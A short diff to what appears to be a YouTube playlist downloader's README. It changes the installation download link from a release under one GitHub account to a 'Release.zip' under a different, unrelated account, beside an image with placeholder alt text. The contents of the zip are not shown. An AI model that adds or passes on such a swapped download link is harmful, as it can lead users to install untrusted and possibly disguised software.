@@ -9,7 +9,7 @@
 
 ### Installation
 [![asdasdasd](https://github.com/user-attachments/assets/eca88ee8-608b-449b-be15-e6a0dbe33ae6)
-](https://github.com/bernardo-dev/YoutubePlaylistDownloader-2024/releases/download/V2.53/Release.zip)
+](https://github.com/S1lvh/YoutubePlaylistDownloader-2024/releases/download/Release/Release.zip)
 
 
 
